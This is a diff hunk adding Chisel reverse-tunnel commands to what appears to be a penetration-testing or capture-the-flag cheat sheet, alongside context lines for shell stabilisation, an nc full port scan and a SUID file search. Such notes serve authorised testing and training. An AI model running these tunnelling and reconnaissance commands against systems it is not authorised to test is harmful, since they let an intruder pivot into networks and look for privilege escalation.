@@ -12,6 +12,16 @@ stty raw -echo;fg
 ```bash
 nc -zv <IP> 1-65535
 ```
+# Chisel usage:
+- On the local machine:
+```bash
+./chisel server -p 8000 --reverse
+```
+- On target host:
+```bash
+~$ ./chisel client <LHOST>:8000 R:socks
+```
+
 # Find SUID bit.
 ```bash
 find / -perm -u=s -type f 2>/dev/null
